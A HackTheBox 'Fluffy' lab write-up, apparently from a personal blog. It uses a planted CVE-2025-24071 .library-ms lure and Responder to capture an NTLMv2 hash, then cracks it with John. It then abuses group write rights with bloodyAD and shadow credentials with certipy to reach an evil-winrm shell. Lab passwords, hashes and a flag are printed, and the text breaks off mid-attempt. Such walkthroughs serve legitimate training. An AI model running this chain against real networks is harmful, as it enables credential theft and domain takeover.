---
title: "Fluffy"
date: 2026-02-14
draft: false

type: "hackthebox"
layout: "single"

tags: ["HackTheBox", "Active Directory", "SMB", "NTLM", "Privilege Escalation"]
categories: ["HackTheBox"]

image: "preview.png"
description: "HackTheBox Fluffy machine writeup"
---


# Fluffy

{{< figure src="Fluffy.png" alt="Fluffy" width="600" >}}

<br>

| **Target IP** | **Username** | **Password** |
| --- | --- | --- |
| 10.10.11.69 | j.fleischman | J0elTHEM4n1990! |

## Pinging

```bash
┌──(kali㉿kali)-[~]
└─$ ping 10.10.11.69          
PING 10.10.11.69 (10.10.11.69) 56(84) bytes of data.
64 bytes from 10.10.11.69: icmp_seq=1 ttl=127 time=1180 ms
64 bytes from 10.10.11.69: icmp_seq=2 ttl=127 time=702 ms
^C
--- 10.10.11.69 ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 2003ms
rtt min/avg/max/mdev = 702.133/941.099/1180.065/238.966 ms, pipe 2
```

The target machine is accessible.

## Nmap

To check open ports

```bash
                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.10.11.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 04:39 EDT
Nmap scan report for 10.10.11.69
Host is up (2.7s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE               VERSION
53/tcp   open  domain                Simple DNS Plus
88/tcp   open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-07-07 15:23:45Z)
139/tcp  open  netbios-ssn?
389/tcp  open  ldap                  Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-07T15:26:42+00:00; +6h37m37s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  ldap                  Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-07T15:26:39+00:00; +6h37m37s from scanner time.
3269/tcp open  ssl/globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http                  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port139-TCP:V=7.95%I=7%D=7/7%Time=686B894B%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,5,"\x83\0\0\x01\x8f")%r(GenericLines,5,"\x83\0\0\x01\x8f")%r(HTT
SF:POptions,5,"\x83\0\0\x01\x8f")%r(RTSPRequest,5,"\x83\0\0\x01\x8f")%r(RP
SF:CCheck,5,"\x83\0\0\x01\x8f")%r(DNSVersionBindReqTCP,5,"\x83\0\0\x01\x8f
SF:")%r(DNSStatusRequestTCP,5,"\x83\0\0\x01\x8f")%r(Help,5,"\x83\0\0\x01\x
SF:8f")%r(SSLSessionReq,5,"\x83\0\0\x01\x8f")%r(TerminalServerCookie,5,"\x
SF:83\0\0\x01\x8f")%r(TLSSessionReq,5,"\x83\0\0\x01\x8f")%r(Kerberos,5,"\x
SF:83\0\0\x01\x8f")%r(X11Probe,5,"\x83\0\0\x01\x8f")%r(FourOhFourRequest,5
SF:,"\x83\0\0\x01\x8f");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date:I 2025-07-07T15:25:49
|_  start_date: N/A
|_clock-skew: mean: 6h37m35s, deviation: 0s, median: 6h37m35s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 598.54 seconds                               
```

The result shows the target has 11 open [ports.](http://ports.So) Ignoring port 53 I’ll check the rest of the ports 

To look up the findings of nmap I first have to add the machine's domain name (from the certificate)

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts
[sudo] password for kali: 
```


{{< figure src="image.png" alt="Fluffy" width="800" >}}

`10.10.11.69    DC01.fluffy.htb fluffy.htb`

I searched for `DC01.fluffy.htb` but got to nowhere then I searched to `fluffy.htb`  

Both didn’t worked then i gave a look to the nmap result an noticed that it is an active directory and the machine gave creds i.e. 

Then I tried to access the `Active Directory` using these provided Creds

```bash
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -H ldap://10.10.11.69 -D "j.fleischman@fluffy.htb" -w 'J0elTHEM4n1990!' -b "dc=fluffy,dc=htb"

# extended LDIF
#
# LDAPv3
# base <dc=fluffy,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
```

This gave the meta data of the `Active Directory` . 

And then i looked for Domain admins 

```bash
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -H ldap://10.10.11.69 -D 'j.fleischman@fluffy.htb' -w 'J0elTHEM4n1990!' -b "dc=fluffy,dc=htb" "(cn=Domain Admins)" member

# extended LDIF
#
# LDAPv3
# base <dc=fluffy,dc=htb> with scope subtree
# filter: (cn=Domain Admins)
# requesting: member 
#

# Domain Admins, Users, fluffy.htb
dn: CN=Domain Admins,CN=Users,DC=fluffy,DC=htb
member: CN=Administrator,CN=Users,DC=fluffy,DC=htb

# search reference
ref: ldap://ForestDnsZones.fluffy.htb/DC=ForestDnsZones,DC=fluffy,DC=htb

# search reference
ref: ldap://DomainDnsZones.fluffy.htb/DC=DomainDnsZones,DC=fluffy,DC=htb

# search reference
ref: ldap://fluffy.htb/CN=Configuration,DC=fluffy,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

It’s of no use getting nowhere , reviewing the result of nmap 

the ports available and there services 

```bash
53/tcp   open  domain                Simple DNS Plus
88/tcp   open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-07-07 15:23:45Z)
139/tcp  open  netbios-ssn?
389/tcp  open  ldap
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP
5985/tcp open  http                  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3269/tcp open  ssl/globalcatLDAPssl?
```

The i tried SMB authentication test: using the creds i.e.  `j.fleischman / J0elTHEM4n1990!`

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.10.11.69 -U "fluffy.htb\\j.fleischman"

Password for [FLUFFY.HTB\j.fleischman]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk      
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.11.69/IT -U "fluffy.htb\\j.fleischman"

Password for [FLUFFY.HTB\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul  7 12:57:32 2025
  ..                                  D        0  Mon Jul  7 12:57:32 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  exploit.zip                         A      319  Mon Jul  7 12:57:33 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

		5842943 blocks of size 4096. 2034527 blocks available
smb: \> get exploit.zip
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \exploit.zip
smb: \> get KeePass-2.58.zip
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (13.6 KiloBytes/sec) (average 13.6 KiloBytes/sec)
smb: \> 

```

I then looked in the .pdf file 

```bash
┌──(kali㉿kali)-[~]
└─$ ls
Assembly_x-64  Desktop  Documents  Downloads  exploit  KeePass-2.58.zip  linpeas.sh  Music  Pictures  Public  Templates  **Upgrade_Notice.pdf**  Videos  work
                                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ xdg-open Upgrade_Notice.pdf
```


{{< figure src="image%201.png" alt="Fluffy" width="600" >}}

The .pdf revealed some of the CVEs the application is vulnerable too.

I Looked for all the CVE’s and I got this 


{{< figure src="image%202.png" alt="Fluffy" width="800" >}}

it is an exploit of `CVE-2025-24071`

[CVE-2025-24071 (2)](https://www.notion.so/CVE-2025-24071-2-27b5bb87e269802ebd1fd6f19556af3a?pvs=21)

Then following the commands i created the exploit under the name of `exploit.zip`  and then used the `put command` to send it to the target device for execution 

```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole 
Metasploit tip: View all productivity tips with the tips command
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use auxiliary/server/ntlm_hash_leak
[-] No results from search
[-] Failed to load module: auxiliary/server/ntlm_hash_leak
msf6 > 
```

😞 No module was there so had to `clone` the repository 

repo link = https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom

```bash
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/FOLKS-IWD/CVE-2025-24071-msfvenom.git
cd CVE-2025-24071-msfvenom
Cloning into 'CVE-2025-24071-msfvenom'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 15 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (15/15), 6.67 KiB | 6.67 MiB/s, done.
Resolving deltas: 100% (2/2), done.

┌──(kali㉿kali)-[~/CVE-2025-24071-msfvenom]
└─$ cp ntlm_hash_leak.rb ~/.msf4/modules/auxiliary/server/

┌──(kali㉿kali)-[~/CVE-2025-24071-msfvenom]
└─$ msfconsole

Metasploit tip: Writing a custom module? After editing your module, why not try 
the reload command
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > reload_all
[*] Reloading modules from all module paths...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[-] Unknown command: reload. Did you mean load? Run the help command for more details.
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1284 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use auxiliary/server/ntlm_hash_leak
msf6 auxiliary(server/ntlm_hash_leak) > 
```

Now the exploit is there and ready to be used!!

I then set the target ip and verified that everything is configured correctly.

```bash
msf6 auxiliary(server/ntlm_hash_leak) > set attacker_ip 10.10.11.69
attacker_ip => 10.10.11.69
msf6 auxiliary(server/ntlm_hash_leak) > show options 

Module options (auxiliary/server/ntlm_hash_leak):

   Name          Current Setting       Required  Description
   ----          ---------------       --------  -----------
   ATTACKER_IP   10.10.11.69           yes       The IP address to which the SMB request will be sent
   FILENAME      exploit.zip           yes       The name of the ZIP file to create
   LIBRARY_NAME  malicious.library-ms  yes       The name of the .library-ms file
   SHARE_NAME    shared                yes       The SMB share name to use in the .library-ms file

View the full module info with the info, or info -d command.

msf6 auxiliary(server/ntlm_hash_leak) > 
```

Directed to the desired Directory ie `Desktop` and typed the run command to get the `.zip` file 

```bash
msf6 auxiliary(server/ntlm_hash_leak) > cd /home/kali/Desktop/
msf6 auxiliary(server/ntlm_hash_leak) > run
[*] Malicious ZIP file created: exploit.zip
[*] Host the file and wait for the victim to extract it.
[*] Ensure you have an SMB capture server running to collect NTLM hashes.
[*] Auxiliary module execution completed
msf6 auxiliary(server/ntlm_hash_leak) > 
```

Now I’ll put the exploit in the target device

```bash
┌──(kali㉿kali)-[~]
└─$ cd Desktop                    
                                                                                                                                                              
┌──(kali㉿kali)-[~/Desktop]
└─$ ls
exploit.zip

┌──(kali㉿kali)-[~/Desktop]
└─$ cp malicious.library-ms .library-ms
                                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Desktop]
└─$ ls
exploit.zip  malicious.library-ms
                                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Desktop]
└─$ ls -a    
.  ..  exploit.zip  .library-ms  malicious.library-ms

                                                                                                                                                              
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.10.11.69/IT -U "fluffy.htb\\j.fleischman"

Password for [FLUFFY.HTB\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> put .library-ms 
putting file .library-ms as \.library-ms (0.1 kb/s) (average 0.1 kb/s)
smb: \> ls
  .                                   D        0  Mon Jul  7 15:17:01 2025
  ..                                  D        0  Mon Jul  7 15:17:01 2025
  .library-ms                         A      365  Mon Jul  7 15:17:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

		5842943 blocks of size 4096. 1548509 blocks available

```

I also set up a listener.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo responder -I tun0 -wd
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.54]
    Responder IPv6             [dead:beef:4::1034]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-BRK0TWPXLCH]
    Responder Domain Name      [I23R.LOCAL]
    Responder DCE-RPC Port     [45388]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:fdc1aa73c3acdb83:B606E98CB19FCB3577179082F267FF74:01010000000000008008F79419EFDB01CA56BEFBA8D8649B0000000002000800490032003300520001001E00570049004E002D00420052004B00300054005700500058004C004300480004003400570049004E002D00420052004B00300054005700500058004C00430048002E0049003200330052002E004C004F00430041004C000300140049003200330052002E004C004F00430041004C000500140049003200330052002E004C004F00430041004C00070008008008F79419EFDB0106000400020000000800300030000000000000000100000000200000406C011FAC88DBC5C00DDEC41C1EAD63CDF9BED3D28B750241CDB10957DE97B20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350034000000000000000000

```

I got the username and it’s NTLM hash

username = `p.agila`
 
NTLM hash =`p.agila::FLUFFY:fdc1aa73c3acdb83:B606E98CB19FCB3577179082F267FF74:01010000000000008008F79419EFDB01CA56BEFBA8D8649B0000000002000800490032003300520001001E00570049004E002D00420052004B00300054005700500058004C004300480004003400570049004E002D00420052004B00300054005700500058004C00430048002E0049003200330052002E004C004F00430041004C000300140049003200330052002E004C004F00430041004C000500140049003200330052002E004C004F00430041004C00070008008008F79419EFDB0106000400020000000800300030000000000000000100000000200000406C011FAC88DBC5C00DDEC41C1EAD63CDF9BED3D28B750241CDB10957DE97B20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350034000000000000000000`

I cracked the hash using the tool john the ripper

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 ntlmv2.hash

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:05 DONE (2025-07-07 08:51) 0.1872g/s 846046p/s 846046c/s 846046C/s promo04..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Desktop]
└─$ john --show ntlmv2.hash

p.agila:prometheusx-303:FLUFFY:fdc1aa73c3acdb83:B606E98CB19FCB3577179082F267FF74:01010000000000008008F79419EFDB01CA56BEFBA8D8649B0000000002000800490032003300520001001E00570049004E002D00420052004B00300054005700500058004C004300480004003400570049004E002D00420052004B00300054005700500058004C00430048002E0049003200330052002E004C004F00430041004C000300140049003200330052002E004C004F00430041004C000500140049003200330052002E004C004F00430041004C00070008008008F79419EFDB0106000400020000000800300030000000000000000100000000200000406C011FAC88DBC5C00DDEC41C1EAD63CDF9BED3D28B750241CDB10957DE97B20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350034000000000000000000

1 password hash cracked, 0 left
                                                                                                                                                                                                                                             
```

password = `prometheusx-303`

Looking for the relations in bloodhound

```bash
┌──(kali㉿kali)-[~]
└─$ sudo bloodhound

 Starting neo4j
Neo4j is running at pid 2261

 Bloodhound will start

 IMPORTANT: It will take time, please wait...

 opening http://127.0.0.1:8080
{"time":"2025-07-08T04:14:25.732693874-04:00","level":"INFO","message":"Reading configuration found at /etc/bhapi/bhapi.json"}
{"time":"2025-07-08T04:14:25.734475864-04:00","level":"INFO","message":"Logging configured"}
{"time":"2025-07-08T04:14:25.797425147-04:00","level":"INFO","message":"No database driver has been set for migration, using: neo4j"}
{"time":"2025-07-08T04:14:25.801730381-04:00","level":"INFO","message":"Connecting to graph using Neo4j"}
{"time":"2025-07-08T04:14:25.802504983-04:00","level":"INFO","message":"Starting daemon Tools API"}
{"time":"2025-07-08T04:14:25.809827923-04:00","level":"ERROR","message":"HTTP server listen error: listen tcp :2112: bind: address already in use"}
{"time":"2025-07-08T04:14:25.857542167-04:00","level":"INFO","message":"No new SQL migrations to run"}
                                                                                                               
```


{{< figure src="image%203.png" alt="Fluffy" width="850" >}}

I found this exploit to add a user in the `Service account` 

## AddMember

This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, Self, AllExtendedRights or Self-Membership, over the target group.


{{< figure src="image%204.png" alt="Fluffy" width="700" >}}

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
```

the command i used 

```bash
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host "10.10.11.69" -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" add groupMember "SERVICE ACCOUNTS" "p.agila"

[+] p.agila added to SERVICE ACCOUNTS
```


{{< figure src="image%205.png" alt="Fluffy" width="850" >}}
So the new user created ie `p.agila`  is a member of `service accounts`


{{< figure src="image%206.png" alt="Fluffy" width="850" >}}
The `outbound` of service account have `generic-write` to three users. So the new user `p.agila` also have `generic-write` access. I now need to abuse this access

The GenericWrite permission in Active Directory `allows a user to modify all writable attributes of an object, except for properties that require special permissions such as resetting passwords.`

If an attacker gains GenericWrite over a user, they can write to the servicePrincipalNames attribute and immediately initiate a targeted Kerberoasting attack.
Moreover, `having GenericWrite over a group enables them to add their account`—or one they control—directly to that group, effectively escalating privileges.

Alternatively, if the attacker obtains GenericWrite over a computer object, `they can modify the msds-KeyCredentialLink attribute.` As a result, they create Shadow Credentials and authenticate as that computer account using Kerberos PKINIT.

## Add user in any outbound Object

The outbound of service account has three services i.e. `CA_SVC,LDAP_SVC, WINRM_SVC` 
here i’ll chose to enumerate the third service i.e. `WINRM_SVC` because:

- Commonly used for **remote shell**, **PowerShell remoting**, and **WMI**
- Often added to **`Remote Management Users`** or even has **local admin rights**
- If it's bound to a **SPN (ServicePrincipalName)** for `WSMAN/` or `HTTP/` — you can abuse RBCD to impersonate `Administrator` to **WinRM**

```
ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-07-08 11:58:02.445278             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 20:51:16.786913  2025-07-08 10:20:24.976539             
```

With `GenericWrite` over a user, you can write to the `“msds-KeyCredentialLink”` attribute. Writing to this property allows an attacker to create `“Shadow Credentials”` on the object and authenticate as the principal using Kerberos PKINIT.

Alternatively, you can write to the `“servicePrincipalNames”` attribute and perform a targeted `kerberoasting attack.` 

got this hash = `33bd09dcd697600edf6b3a7af4875767`

Using the Following command 

```
┌──(kali㉿kali)-[~]
└─$ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -target '10.10.11.69'
Certipy v4.8.2 - by Oliver Lyak (ly4k)
```

Got the PowerShell access 

```
                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.69 -u "WINRM_SVC" -H "33bd09dcd697600edf6b3a7af4875767" 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
```

Got the user flag

```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ls
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ..
*Evil-WinRM* PS C:\Users\winrm_svc> ls

    Directory: C:\Users\winrm_svc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/17/2025  11:56 AM                Desktop
d-r---        5/19/2025   9:15 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos

*Evil-WinRM* PS C:\Users\winrm_svc> cd Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls

    Directory: C:\Users\winrm_svc\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/8/2025  11:05 AM             34 user.txt

*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
d924bdd5158f23b516307d702be92918
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> 
```

user flag = `d924bdd5158f23b516307d702be92918`

To get the Root Flag I executed WinPeas.exe but found nothing useful, then searched for vulnerable templates of the AD

```
                                                                                                                                                                                                                                              
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy find -u 'p.agila' -p "prometheusx-303" -dc-ip 10.10.11.69 -vulnerable -enabled
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250708085611_Certipy.txt'
[*] Wrote text output to '20250708085611_Certipy.txt'
[*] Saving JSON output to '20250708085611_Certipy.json'
[*] Wrote JSON output to '20250708085611_Certipy.json' 
```

Tried on `CA_SVC` but didn’t got any hash

```
┌──(work)─(kali㉿kali)-[~]
└─$ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'CA_SVC' -target '10.10.11.69' -dc-ip 10.10.11.69
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c1867b95-9641-ecee-4b5d-3d36f25250c4'
[*] Adding Key Credential with device ID 'c1867b95-9641-ecee-4b5d-3d36f25250c4' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'c1867b95-9641-ecee-4b5d-3d36f25250c4' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
